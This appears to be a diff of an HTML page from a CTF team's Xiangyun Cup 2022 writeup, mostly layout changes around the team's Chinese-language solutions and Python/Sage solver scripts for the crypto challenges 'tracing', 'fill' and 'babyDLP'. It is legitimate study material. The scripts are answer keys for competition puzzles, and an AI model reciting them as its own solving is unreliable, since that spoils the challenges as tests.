-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393</span>
 </span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883</span>
@@ -2064,38 +1193,9 @@ flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
 </span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">tmp</span><span class="o">^</span><span class="p">(</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="p">)))</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="tracing">tracing</h2>
+</span></span></code></pre></div><h2 id="tracing">tracing</h2>
 <p>题目自己实现了求公因数的算法gcd，主要是通过分支语句，加减法和移位操作来实现的；而trace.out文件则是类似于debug，打印了gcd算法整个过程的分支执行情况，所以我们只要用最后的a和b的值去反推整个算法，得到phi解密即可。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">invert</span>
 </span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102</span>
 </span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301</span>
@@ -2118,57 +1218,9 @@ flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
 </span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="n">attack_phi</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)))</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="fill">fill</h2>
+</span></span></code></pre></div><h2 id="fill">fill</h2>
 <p>利用lcg的三组连续输出求出参数m和c，从而得到整个序列s，反求出序列M；然后就是一个背包的破解，lll算法求最短向量即可，构造方式参考：https://www.ruanx.net/lattice-2/，exp：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="mi">19620578458228</span><span class="p">,</span> <span class="mi">39616682530092</span><span class="p">,</span> <span class="mi">3004204909088</span><span class="p">,</span> <span class="mi">6231457508054</span><span class="p">,</span> <span class="mi">3702963666023</span><span class="p">,</span> <span class="mi">48859283851499</span><span class="p">,</span> <span class="mi">4385984544187</span><span class="p">,</span> <span class="mi">11027662187202</span><span class="p">,</span> <span class="mi">18637179189873</span><span class="p">,</span> <span class="mi">29985033726663</span><span class="p">,</span> <span class="mi">20689315151593</span><span class="p">,</span> <span class="mi">20060155940897</span><span class="p">,</span> <span class="mi">46908062454518</span><span class="p">,</span> <span class="mi">8848251127828</span><span class="p">,</span> <span class="mi">28637097081675</span><span class="p">,</span> <span class="mi">35930247189963</span><span class="p">,</span> <span class="mi">20695167327567</span><span class="p">,</span> <span class="mi">36659598017280</span><span class="p">,</span> <span class="mi">10923228050453</span><span class="p">,</span> <span class="mi">29810039803392</span><span class="p">,</span> <span class="mi">4443991557077</span><span class="p">,</span> <span class="mi">31801732862419</span><span class="p">,</span> <span class="mi">23368424737916</span><span class="p">,</span> <span class="mi">15178683835989</span><span class="p">,</span> <span class="mi">34641771567914</span><span class="p">,</span> <span class="mi">44824471397533</span><span class="p">,</span> <span class="mi">31243260877608</span><span class="p">,</span> <span class="mi">27158599500744</span><span class="p">,</span> <span class="mi">2219939459559</span><span class="p">,</span> <span class="mi">20255089091807</span><span class="p">,</span> <span class="mi">24667494760808</span><span class="p">,</span> <span class="mi">46915118179747</span><span class="p">]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="mi">19620578458228</span><span class="p">,</span> <span class="mi">39616682530092</span><span class="p">,</span> <span class="mi">3004204909088</span><span class="p">,</span> <span class="mi">6231457508054</span><span class="p">,</span> <span class="mi">3702963666023</span><span class="p">,</span> <span class="mi">48859283851499</span><span class="p">,</span> <span class="mi">4385984544187</span><span class="p">,</span> <span class="mi">11027662187202</span><span class="p">,</span> <span class="mi">18637179189873</span><span class="p">,</span> <span class="mi">29985033726663</span><span class="p">,</span> <span class="mi">20689315151593</span><span class="p">,</span> <span class="mi">20060155940897</span><span class="p">,</span> <span class="mi">46908062454518</span><span class="p">,</span> <span class="mi">8848251127828</span><span class="p">,</span> <span class="mi">28637097081675</span><span class="p">,</span> <span class="mi">35930247189963</span><span class="p">,</span> <span class="mi">20695167327567</span><span class="p">,</span> <span class="mi">36659598017280</span><span class="p">,</span> <span class="mi">10923228050453</span><span class="p">,</span> <span class="mi">29810039803392</span><span class="p">,</span> <span class="mi">4443991557077</span><span class="p">,</span> <span class="mi">31801732862419</span><span class="p">,</span> <span class="mi">23368424737916</span><span class="p">,</span> <span class="mi">15178683835989</span><span class="p">,</span> <span class="mi">34641771567914</span><span class="p">,</span> <span class="mi">44824471397533</span><span class="p">,</span> <span class="mi">31243260877608</span><span class="p">,</span> <span class="mi">27158599500744</span><span class="p">,</span> <span class="mi">2219939459559</span><span class="p">,</span> <span class="mi">20255089091807</span><span class="p">,</span> <span class="mi">24667494760808</span><span class="p">,</span> <span class="mi">46915118179747</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">S</span> <span class="o">=</span> <span class="mi">492226042629702</span>
 </span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">L</span> <span class="o">=</span> <span class="n">matrix</span><span class="o">.</span><span class="n">zero</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
@@ -2210,82 +1262,9 @@ flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">short2</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">short2</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="babydlp">babyDLP</h2>
+</span></span></code></pre></div><h2 id="babydlp">babyDLP</h2>
 <p>CryptoCTF2022的原题side step，参考春哥的解法：https://zhuanlan.zhihu.com/p/546270351 exp需要修改两个地方，1是if (&lsquo;Great!&rsquo; in a):需要加上b，其次是a = a[9:]改为a = a[8:] 。然后直接打即可：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sage.all</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
@@ -2352,95 +1331,103 @@ flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">g</span> <span class="o">=</span> <span class="n">Gao</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">    <span class="n">g</span><span class="o">.</span><span class="n">gao_2</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
+</span></span></code></pre></div>
 
-        
-          <div class="blog-tags">
+            
+              <div class="blog-tags">
+                
+                  <a href="http://localhost:1313/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/">祥云杯</a>
+                
+              </div>
+            
+
+            
+
             
               
-              <a href="http://localhost:1313/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/">祥云杯</a>&nbsp;
+
+              
             
-          </div>
+          </article>
+        </section>
+
+        
+          <ul class="pager blog-pager">
+            
+              <li class="previous">
+                <a href="/post/pcb-2022-su-wu/" data-toggle="tooltip" data-placement="top" title="2022 鹏城杯 SU Writeup">&larr; Previous Post</a>
+              </li>
+            
+            
+              <li class="next">
+                <a href="/post/ntfy-2022-su-wu/" data-toggle="tooltip" data-placement="top" title="第五届“强网”拟态防御国际精英挑战赛 SU Writeup">Next Post &rarr;</a>
+              </li>
+            
+          </ul>
         
 
         
-
-        
-          
-
-          
-        
-      </article>
-
-      
-        <ul class="pager blog-pager">
-          
-            <li class="previous">
-              <a href="http://localhost:1313/post/pcb-2022-su-wu/" data-toggle="tooltip" data-placement="top" title="2022 鹏城杯 SU Writeup">&larr; Previous Post</a>
-            </li>
-          
-          
-            <li class="next">
-              <a href="http://localhost:1313/post/ntfy-2022-su-wu/" data-toggle="tooltip" data-placement="top" title="第五届“强网”拟态防御国际精英挑战赛 SU Writeup">Next Post &rarr;</a>
-            </li>
-          
-        </ul>
-      
-
-
-      
-
-    </div>
+      </div>
   </div>
 </div>
 
-      <footer>
+      <footer class="site-footer">
   <div class="container">
     
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <ul class="list-inline text-center footer-links">
+
+    <div class="site-footer__grid">
+      <div class="site-footer__brand">
+        <p class="site-footer__eyebrow">SU TEAM // BATTLE LOG</p>
+        <h2 class="site-footer__title">su-team</h2>
+        <p class="site-footer__tagline">
+          Built for team archives and competition writeups.
+          
+            <span class="site-footer__subline">Minimal noise, high signal, and fast navigation.</span>
+          
+        </p>
+      </div>
+
+      <div class="site-footer__meta">
+        <ul class="list-inline footer-links">
           
               <li>
                 
-		  <a href="https://ctftime.org/team/29641" title="CTFTime">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <img src="http://localhost:1313/img/ctftime.svg" title="CTFTime" alt="CTFTime" style="width:60%;height:60%;position:absolute;top:20%;left:20%">
-                    
-                  </span>
-                </a>
+                  <a href="https://ctftime.org/team/29641" title="CTFTime">
+                
+                    <span class="footer-link__icon">
+                      
+                        
+                          <img class="footer-social-img" src="/img/ctftime.svg" title="CTFTime" alt="CTFTime">
+                        
+                      
+                    </span>
+                  </a>
               </li>
               <li>
                 
-		  <a href="mailto:suers_xctf@126.com" title="Email me">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
-                    
-                  </span>
-                </a>
+                  <a href="mailto:suers_xctf@126.com" title="Email me">
+                
+                    <span class="footer-link__icon">
+                      
+                        <i class="fas fa-envelope" aria-hidden="true"></i>
+                      
+                    </span>
+                  </a>
               </li>
               <li>
                 
-		  <a href="https://github.com/team-su" title="GitHub">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                    
-                  </span>
-                </a>
+                  <a href="https://github.com/team-su" title="GitHub">
+                
+                    <span class="footer-link__icon">
+                      
+                        <i class="fab fa-github" aria-hidden="true"></i>
+                      
+                    </span>
+                  </a>
               </li>
           
         </ul>
+
         <p class="credits copyright text-muted">
           
             
@@ -2455,10 +1442,10 @@ flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
 
           
             &nbsp;&bull;&nbsp;
-            <a href="http://localhost:1313/">su-team</a>
+            <a href="/">su-team</a>
           
         </p>
-        
+
         <p class="credits theme-by text-muted">
           <a href="https://gohugo.io">Hugo v0.157.0</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
           
@@ -2489,8 +1476,6 @@ flag{890topico_y0u_Ar3_tHe_LInUx_forEnsIcS_MASTER}</p>
 
 <script src="http://localhost:1313/js/main.js"></script><script src="http://localhost:1313/js/photoswipe.min.js"></script>
 <script src="http://localhost:1313/js/photoswipe-ui-default.min.js"></script><script src="http://localhost:1313/js/load-photoswipe.js"></script>
-
-
 
 
 
